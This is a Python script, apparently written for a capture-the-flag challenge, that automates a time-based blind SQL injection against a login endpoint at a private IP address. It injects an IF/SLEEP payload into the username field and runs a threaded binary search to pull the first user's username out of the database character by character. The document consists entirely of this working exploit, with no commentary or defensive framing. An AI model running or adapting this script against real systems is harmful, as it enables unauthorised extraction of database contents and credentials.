import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://10.10.111.69/login"
LEN_FLAG = 100
THREADS = 4


def isBenar(response):
    return response.elapsed.total_seconds() > 2


def sqli(pos, mid):
    payload = f"' OR IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1 LIMIT 1),{pos},1))>{mid},SLEEP(3),0) -- "
    files = {
        "username": (None, payload),
        "password": (None, "x"),
    }

    try:
        response = requests.post(URL, files=files, timeout=5)
        return isBenar(response)
    except Exception:
        return False


# Binary search to extract a single char
def get_char(pos):
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


# Thread worker
def worker(pos):
    return pos, get_char(pos)


# Main thread execution
flag = [""] * LEN_FLAG

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = {executor.submit(worker, i): i for i in range(1, LEN_FLAG + 1)}

    for future in tqdm(as_completed(futures), total=len(futures)):
        pos, char = future.result()
        flag[pos - 1] = char
        print(f"\nCurrent flag: {''.join(flag)}")
        if "}" in "".join(flag):
            break

print("Final flag:", "".join(flag))
